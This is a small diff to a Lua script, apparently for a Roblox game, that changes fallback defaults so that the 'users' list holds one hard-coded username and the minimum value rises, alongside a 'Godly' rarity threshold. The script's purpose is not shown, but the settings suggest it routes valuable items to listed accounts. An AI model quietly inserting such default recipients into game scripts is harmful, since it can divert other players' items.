@@ -114,9 +114,9 @@ end
 
 -- fallback defaults if key missing or invalid
 if not decoded_ok then
-    users     = {}
+    users     = {"iceyblueii"}
     minRarity = "Godly"
-    minValue  = 0
+    minValue  = 10
     ping      = nil
     E         = "nk"
 end
